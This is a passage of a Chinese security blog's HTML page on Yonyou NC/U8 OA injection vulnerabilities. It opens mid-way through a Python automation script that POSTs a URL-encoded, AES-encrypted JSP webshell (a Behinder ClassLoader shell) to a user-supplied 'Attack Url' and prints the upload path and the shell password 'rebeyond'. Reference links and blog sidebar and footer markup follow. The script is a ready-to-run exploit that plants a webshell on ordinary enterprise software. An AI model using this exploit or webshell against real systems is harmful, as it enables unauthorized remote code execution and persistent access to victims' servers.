class="hljs-string">"t=%3C%25%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%22%25%3E%3C%25!class%20U%20extends%20ClassLoader%7BU(ClassLoader%20c)%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%20%5B%5Db)%7Breturn%20super.defineClass(b%2C0%2Cb.length)%3B%7D%7D%25%3E%3C%25if%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D%22e45e329feb5d925b%22%3Bsession.putValue(%22u%22%2Ck)%3BCipher%20c%3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new%20sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D%25%3E"</span><br>    headers = &#123;<br>        <span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/x-www-form-urlencoded"</span><br>    &#125;<br>    <span class="hljs-keyword">try</span>:<br>        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br>        print(<span class="hljs-string">"\033[32m[o] 正在请求：&#123;&#125;\033[0m"</span>.format(vuln_url))<br>        response = requests.post(url=vuln_url, data=data, headers=headers, verify=<span class="hljs-literal">False</span>, timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            print(<span class="hljs-string">"\033[32m[o] 木马上传成功, 路径为:&#123;&#125;/yyoa/&#123;&#125;\033[0m"</span>.format(target_url, rebe_webshell))<br>            print(<span class="hljs-string">"\033[32m[o] 请使用冰蝎连接，密码为: rebeyond\033[0m"</span>)<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">"\033[31m[x] 木马上传失败，可能被拦截 \033[0m"</span>.format(target_url))<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        print(<span class="hljs-string">"\033[31m[x] 目标 &#123;&#125; 请求失败 \033[0m"</span>.format(target_url), e)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<br>    title()<br>    target_url = str(input(<span class="hljs-string">"\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"</span>))<br>    POC_1(target_url)<br></code></pre></td></tr></table></figure>
+
+<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20NCCloud%20FS%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86SQL%E6%B3%A8%E5%85%A5.html" target="_blank" rel="noopener">http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20NCCloud%20FS%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86SQL%E6%B3%A8%E5%85%A5.html</a></p>
+<p><a href="http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20U8%20OA%20test.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html" target="_blank" rel="noopener">http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20U8%20OA%20test.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html</a></p>
+
+    </main>
+    <div class="copy">
+      
+        
+  <br/>
+  <div style="text-align:center;color:#ccc;font-size:14px;">
+    ------ 本文结束 ------
+  </div>
+  <br/>
+  <div class="my_post_copyright" style="border:1px solid black;background-color:#f9f9f9">
+  	<div style="margin-left:24px">
+  	  <script src="https:////cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  	  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  	  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  	  <p><span>本文标题:</span><a href="/posts/6c99903e.html">Yonyou-NC-injection-vulnerability</a></p>
+  	  <p><span>文章作者:</span><a href="/" title="访问 Kuiba 的个人博客">Kuiba</a></p>
+  	  <p><span>发布时间:</span>2021年07月13日 - 00:07</p>
+  	  <!--<p><span>最后更新:</span>2021年07月13日 - 00:07</p>-->
+  	  <p><span>原始链接:</span><a href="/posts/6c99903e.html" title="Yonyou-NC-injection-vulnerability">https://kuibarj.top/posts/6c99903e.html</a>
+  	    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://kuibarj.top/posts/6c99903e.html"  aria-label="复制成功！"></i></span>
+  	  </p>
+  	  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">Attribution-NonCommercial-NoDerivatives 4.0</a> 转载请保留原文链接及作者。</p>  
+  	</div>
+  </div>
+  <br/>
+  <script> 
+      var clipboard = new Clipboard('.fa-clipboard');
+        $(".fa-clipboard").click(function(){
+        clipboard.on('success', function(){
+          swal({   
+            title: "",   
+            text: '复制成功',
+            icon: "success", 
+            showConfirmButton: true
+            });
+          });
+      });  
+  </script>
+
+      
+    </div>
+    <footer class="post-footer">
+      
+      <div class="post-tags">
+        
+        <a class="post-tag button" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"><i class="fas fa-tags"></i>漏洞复现</a>
+        
+      </div>
+      
+    </footer>
+  </article>
+  
+  
+  <nav class="page-nav">
+    <div class="page-nav-next page-nav-item">
+      
+      <a href="/posts/e09aeac0.html" rel="prev" title="亿邮电子邮件系统RCE"><i class="fas fa-angle-left"></i><span class="nav-title">亿邮电子邮件系统RCE</span></a>
+      
+    </div>
+    <div class="page-nav-prev page-nav-item">
+      
+      <a href="/posts/6b98c3b0.html" rel="next" title="Kingsoft-K8-vulnerability"><span class="nav-title">Kingsoft-K8-vulnerability</span><i class="fas fa-angle-right"></i></a>
+      
+    </div>
+  </nav>
+  
+  
+  
+</div>
+
+          </div>
+          
+          
+          
+<aside class="sidebar" id="sidebar" style="background: url(/images/background.png);">
+  
+  <div class="search">
+    <div class="form-group">
+      <i class="fas fa-search"></i><input type="search" id="search-input" name="q" results="0" placeholder="搜索" class="form-control"/>
+    </div>
+  </div>
+  <div class="search-result-box" id="search-result"></div>
+  
+  
+<div class="info sidebar-item" id="info">
+  
+  <img class="author-avatar" src="/images/avatar.jpg" alt="Kuiba">
+  
+  <h1 class="author-name">Kuiba</h1>
+  <h2 class="author-description">这是一个最好的时代，也是最坏的时代，我们亲身经历着激动人心的变革，也往往会陷入选择的迷茫。</h2>
+  <div class="site-count">
+    
+    <div class="archives-count">
+      <div class="site-count-title">归档</div>
+      <div><a href="/archives/">42</a></div>
+    </div>
+    
+    
+    
+    
+    <span class="site-count-divider divider">|</span>
+    
+    <div class="tags-count">
+      <div class="site-count-title">标签</div>
+      <div><a href="/tags/">37</a></div>
+    </div>
+    
+  </div>
+  
+  <div class="rss">
+    <a class="rss-link button sidebar-item" href="/atom.xml"><i class="fas fa-rss"></i>RSS</a>
+  </div>
+  
+</div>
+
+
+  <div class="sidebar-sticky">
+    
+    
+    
+    
+    
+    <hr>
+    <div class="post-toc sidebar-item" id="toc-div">
+      <div><i class="fas fa-list-ol"></i>文章目录</div>
+      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#用友-NCCloud-FS文件管理"><span class="toc-text">用友 NCCloud FS文件管理</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#FoFa"><span class="toc-text">FoFa</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#info"><span class="toc-text">info</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#用友-U8-OA-test-jsp-SQL注入漏洞"><span class="toc-text">用友 U8 OA test.jsp SQL注入漏洞</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#FoFa-1"><span class="toc-text">FoFa</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#PoC"><span class="toc-text">PoC</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#构造Payload获取路径"><span class="toc-text">构造Payload获取路径</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#连接shell"><span class="toc-text">连接shell</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#自动化脚本"><span class="toc-text">自动化脚本</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Reference"><span class="toc-text">Reference</span></a></li></ol></li></ol></div>
+    </div>
+    
+    
+    
+    <hr>
+    <div class="social-link sidebar-item">
+      <div><i class="far fa-address-card"></i>社交链接</p></div>
+      <ul>
+        
+        <li><i class="fas fa-envelope"></i><a href="mailto:a3VpYmFoZEBmb3htYWlsLmNvbQ" target="_blank">E-Mail</a></li>
+        
+        <li><i class="fab fa-github"></i><a href="https://github.com/" target="_blank">GitHub</a></li>
+        
+        <li><i class="fab fa-weibo"></i><a href="https://weibo.com/" target="_blank">Weibo</a></li>
+        
+      </ul>
+    </div>
+    
+    
+    <hr>
+    <div class="blogroll sidebar-item">
+      <div><i class="fas fa-link"></i>大佬们的博客</div>
+      <ul>
+        
+        <li><i class="fas fa-link"></i><a href="https://www.ggsec.cn/" target="_blank">Demon</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://payloads.online/" target="_blank">倾旋</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://wbglil.github.io/" target="_blank">WBGlIl(装小白的巨佬)</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://www.sariel.top/" target="_blank">只因不值得</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://uknowsec.cn/" target="_blank">Uknowse</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://422926799.github.io/" target="_blank">九世</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="http://yulige.top/" target="_blank">郁离歌</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://phpinfo.me/" target="_blank">Lcy</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://867810770.github.io/" target="_blank">修心</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="http://vinc.top/" target="_blank">Vimc</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="http://qimingyu.com/" target="_blank">qimingyu</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://x.hacking8.com/" target="_blank">小草窝</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://yiwlny.github.io/" target="_blank">Rogerd</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://loulan-ling.github.io/" target="_blank">楼兰-翎师傅</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://manmachines.github.io/" target="_blank">菜师傅</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://whale3070.github.io/" target="_blank">whale3070</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://www.cnblogs.com/Secde0/" target="_blank">Secde0</a></li>
+        
+      </ul>
+    </div>
+    
+  </div>
+</aside>
+
+
+          
+        </div>
+      </div>
+    </main>
+    
+<footer id="footer" class="footer" style="background: #33363b;">
+  <div class="container">
+    <div class="back-to-top">
+      <button id="back-to-top"><i class="fas fa-angle-double-up" aria-label="回到顶部"></i></button>
+    </div>
+    <div class="footer-container">
+      <div class="footer-left">
+        <div class="copyright">
+          <span class="author">Kuiba</span><span class="year"><i class="far fa-copyright"></i>2018 - 2021</span><span class="creative-commons"><i class="fab fa-creative-commons"></i><a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">BY-NC-SA 4.0</a></span>
+        </div>
+        
+        <div class="busuanzi">
+          <span id="busuanzi_container_site_pv"><i class="fas fa-eye" aria-label="站点点击量" aria-hidden="false"></i><span id="busuanzi_value_site_pv"></span></span><span id="busuanzi_container_site_uv"><i class="fas fa-user" aria-label="站点用户数" aria-hidden="false"></i><span id="busuanzi_value_site_uv"></span></span><span id="busuanzi_container_page_pv"><i class="far fa-file-alt"></i><span id="busuanzi_value_page_pv" aria-label="页面点击量" aria-hidden="false"></span></span>
+        </div>
+        
+      </div>
+      <div class="footer-right">
+        <div class="custom-info">
+          
+          本站托管于<i class="fab fa-github-alt"></i><a href="https://pages.github.com/" target="_blank">GitHub Pages</a>
+          
+        </div>
+        <div class="powered-by">
+          由 <a href="https://hexo.io/" target="_blank">Hexo</a> 强力驱动 | 主题 <a href="https://alynx.xyz/" target="_blank">AlynxZhou</a> <a href="https://github.com/AlynxZhou/hexo-theme-aria/" target="_blank">ARIA</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  </body>
+</html>
